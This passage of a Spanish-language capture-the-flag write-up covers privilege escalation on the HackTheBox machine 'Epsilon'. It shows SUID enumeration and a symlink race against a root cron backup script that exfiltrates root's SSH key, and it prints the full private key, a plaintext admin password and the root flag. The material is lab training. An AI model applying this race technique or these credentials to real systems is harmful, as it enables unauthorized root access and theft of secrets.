  <li>Si las probamos <code class="language-plaintext highlighter-rouge">admin:4d_09@fhgRTdws2</code> funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/19.png" />
</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Vemos el <code class="language-plaintext highlighter-rouge">pkexec</code> pero lo vamos a explotar <a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enumerar tareas cron <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</p>
  </li>
  <li>
    <p>Si lo ejecutamos encontramos un <code class="language-plaintext highlighter-rouge">backup.sh</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/20.png" />
</p>

<ul>
  <li>Este es el codigo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/dev/shm<span class="nv">$ </span><span class="nb">cat cat</span> /usr/bin/backup.sh
<span class="nb">cat</span>: <span class="nb">cat</span>: No such file or directory
<span class="c">#!/bin/bash</span>
<span class="nv">file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
/usr/bin/tar <span class="nt">-cvf</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> /var/www/app/
<span class="nb">sha1sum</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f1</span> <span class="o">&gt;</span> /opt/backups/checksum
<span class="nb">sleep </span>5
<span class="nv">check_file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
/usr/bin/tar <span class="nt">-chvf</span> <span class="s2">"/var/backups/web_backups/</span><span class="k">${</span><span class="nv">check_file</span><span class="k">}</span><span class="s2">.tar"</span> /opt/backups/checksum <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span>
/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/21.png" />
</p>

<ul>
  <li>Podemos ver lo <code class="language-plaintext highlighter-rouge">.tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/backups/web_backups
total 3920
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:35 095722698.tar
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:36 111519042.tar
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:37 125049838.tar
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:38 140228143.tar
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a irnos a la ruta <code class="language-plaintext highlighter-rouge">/tmp</code> y crearemos un script.sh y le daremos permisos de ejecución.</p>
  </li>
  <li>
    <p>Vamos a crear el archivo <code class="language-plaintext highlighter-rouge">/opt/backups/checksum</code> después lo vamos a borrar para hacer un enlace a <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> y secuestrarlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">cat </span>zi.sh
<span class="c">#!/bin/bash</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
	if</span> <span class="o">[</span> <span class="nt">-e</span> /opt/backups/checksum <span class="o">]</span><span class="p">;</span> <span class="k">then
		</span><span class="nb">rm</span> /opt/backups/checksum
		<span class="nb">ln</span> <span class="nt">-s</span> <span class="nt">-f</span> /root/.ssh/id_rsa /opt/backups/checksum
	       <span class="nb">break
</span><span class="k">fi
done
</span>tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x zi.sh
</code></pre></div></div>

<ul>
  <li>
    <p>Esperamos unos minutos a que se ejecute la tarea.</p>
  </li>
  <li>
    <p>Vamos a descomprimir el mas nuevo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp<span class="nv">$ </span>./zi.sh
^C
tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">cd</span> /var/backups/web_backups/
tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 980
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:50 311632114.tar
tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">cp </span>311632114.tar /tmp
tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">cd</span> /tmp
tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> 311632114.tar
tom@epsilon:/opt/backups<span class="nv">$ </span><span class="nb">cd</span> /tmp/opt/backups/
</code></pre></div></div>

<ul>
  <li>Vemos la id_rsa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp/opt/backups<span class="nv">$ </span><span class="nb">cat </span>checksum 
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">BqhGglrHoh2JycJwAAAAxyb290QGVwc2lsb24BAgMEBQ</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
tom@epsilon:/tmp/opt/backups<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>

<ul>
  <li>Ahora podemos conectarnos como root por ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nano id_rsa
❯ <span class="nb">chmod </span>600 id_rsa
❯ ssh <span class="nt">-i</span> id_rsa root@10.10.11.134
The authenticity of host <span class="s1">'10.10.11.134 (10.10.11.134)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:36: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.134<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Jul 2024 01:56:45 AM UTC

  System load:                      0.01
  Usage of /:                       67.1% of 5.78GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        241
  Users logged in:                  0
  IPv4 address for br-a2acb156d694: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.134
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:a1e8

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb  7 01:51:07 2022
root@epsilon:~# export TERM=xterm
root@epsilon:~# cat /root/root.txt
8a3e087754468be6d4bb82429fdae0db
</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>